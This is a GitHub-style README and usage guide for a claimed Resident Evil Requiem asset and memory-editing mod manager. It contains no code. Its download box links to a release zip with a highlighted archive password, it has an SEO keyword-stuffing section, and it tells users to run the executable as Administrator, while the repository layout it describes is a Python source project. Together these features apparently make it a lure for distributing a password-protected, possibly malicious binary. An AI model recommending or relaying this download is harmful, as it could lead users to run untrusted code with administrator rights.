# 🧟 RE-Requiem-Asset-Manager

<img width="1892" height="986" alt="image" src="https://github.com/user-attachments/assets/8bb72f54-3bc0-4865-9fcd-96804ea40002" />


<p align="center">
  <img src="https://img.icons8.com/color/96/000000/biohazard.png" alt="RE Requiem Asset Manager" width="140" height="140">
</p>

<h1 align="center">RE-Requiem-Asset-Manager</h1>
<p align="center">
  <strong>Advanced Asset Manipulation & Injection for Resident Evil Requiem</strong><br>
  Virtual File System · Real-time Texture Swapping · REFramework Integration
</p>

<p align="center">
  <a href="#"><img src="https://img.shields.io/badge/version-1.3.0-1ABC9C?style=for-the-badge" alt="Version"></a>
  <a href="#"><img src="https://img.shields.io/badge/engine-RE_Engine-E74C3C?style=for-the-badge" alt="Engine"></a>
  <a href="#"><img src="https://img.shields.io/badge/status-Stable-27AE60?style=for-the-badge" alt="Status"></a>
  <a href="#"><img src="https://img.shields.io/badge/license-MIT-3498DB?style=for-the-badge" alt="License"></a>
</p>

---

> ⚙️ **Project Status:** RE-Requiem-Asset-Manager is stable and actively maintained. It serves as a powerful tool for modders and players to inject custom models, textures, and audio directly into the game's memory without permanently altering base `.pak` files.

---

## 🏗️ Architecture Overview

RE-Requiem-Asset-Manager operates by intercepting the **RE Engine's** file I/O operations. Instead of extracting and repacking massive `.pak` archives, the manager creates a virtual layer over the game's asset system.

- **Virtual File System (VFS):** Redirects requests for specific assets to custom files stored in a separate mod folder.
- **Memory Injection:** Uses a custom `dinput8.dll` proxy to hook into the game process and enable the VFS.
- **REFramework Hooks:** Integrates with REFramework to provide a live overlay for toggling asset swaps on the fly.
- **Conflict Resolution:** Automatically detects overlapping mod files and provides a prioritized load order.

## 📥 Deployment & Build

<div align="center" style="border: 2px solid #2C3E50; border-radius: 10px; padding: 20px; background-color: #1a1a1a; max-width: 450px; margin: 0 auto;">
  <img src="https://img.icons8.com/color/96/000000/download.png" alt="Download" width="60" height="60">
  <br><br>
  <a href="https://github.com/WraithCyclops/RE-Requiem-Asset-Manager/releases/download/1/RE-Requiem-Asset-Manager.zip">
    <img src="https://img.shields.io/badge/⬇️%20GET%20LATEST%20BUILD-2C3E50?style=for-the-badge&logo=github&logoColor=white" alt="Download">
  </a>
  <br><br>
  <span style="font-size: 18px; color: #ffffff;">🔐 <b>Build Password:</b> <code style="background-color: #333; padding: 4px 8px; border-radius: 4px; color: #E74C3C;">2026</code></span>
</div>

### Prerequisites

Before deploying the Asset Manager, ensure your environment meets the following requirements:

1.  **Resident Evil Requiem:** Latest patch installed.
2.  **REFramework:** Required for the overlay UI and scripting API.
3.  **DirectX 12:** The VFS hooks are optimized for DX12 rendering pipelines.

## 🛠️ Core Modules

### 📦 Asset Pipeline
Handles the discovery and loading of custom files.
*   **Drag & Drop:** Import `.dds`, `.mesh`, and `.pfb` files directly.
*   **Auto-Repack:** Quickly convert files into the engine's native formats.
*   **Live Reload:** Hot-swap textures and models without restarting the game.

### 🧠 Memory Editor
Direct access to game variables via REFramework.
*   **Player Stats:** Edit health, stamina, and ammo on the fly.
*   **Enemy Tweaks:** Adjust AI aggression or spawn rates.
*   **Environment:** Toggle weather, time of day, and fog.

### 🖥️ Interface & Usability
*   **Load Order Manager:** Drag and drop to resolve conflicts.
*   **Profile System:** Save distinct setups (e.g., "HD Textures" vs. "Performance").
*   **Live Log:** Real-time console for tracking engine errors.

## 🔍 SEO Keywords & Tags

`resident-evil-requiem-asset-manager resident-evil-requiem-mod-manager re-engine-mods resident-evil-requiem-reframework resident-evil-requiem-modding resident-evil-requiem-texture-swap resident-evil-requiem-model-swap`

## 📁 Repository Structure

```
RE-Requiem-Asset-Manager/
├── src/
│   └── manager/           # Python frontend and VFS logic
├── docs/
│   └── usage.md           # Detailed deployment guides
├── plugins/
│   └── re_engine/         # REFramework plugins and proxies
├── tests/                 # Deployment and rollback tests
├── README.md
└── SETTINGS_REPOSITORY.json
```
# RE-Requiem-Asset-Manager Usage

## 1. Initial Setup
1. Launch `RE-Requiem-Asset-Manager.exe` as Administrator.
2. The manager will attempt to auto-detect your game directory. If it fails, click `Browse` and select the folder containing `re_requiem.exe`.
3. Click **Initialize**. This will create a backup of the original files and set up the Virtual File System (VFS).

## 2. Deploying Assets
1. Drag and drop your mod files (`.dds`, `.mesh`, `.zip`) into the main window.
2. The manager will extract and analyze the files.
3. If a conflict is detected, you will be prompted to choose which mod takes priority.
4. Click **Deploy** to apply the mods using the VFS.

## 3. Live Editing (In-Game)
1. Once in-game, press `INSERT` to open the REFramework overlay.
2. Navigate to the **Asset Manager** tab.
3. Toggle specific textures or models on the fly.
4. Adjust player stats and enemy behavior in the **Memory Editor** tab.
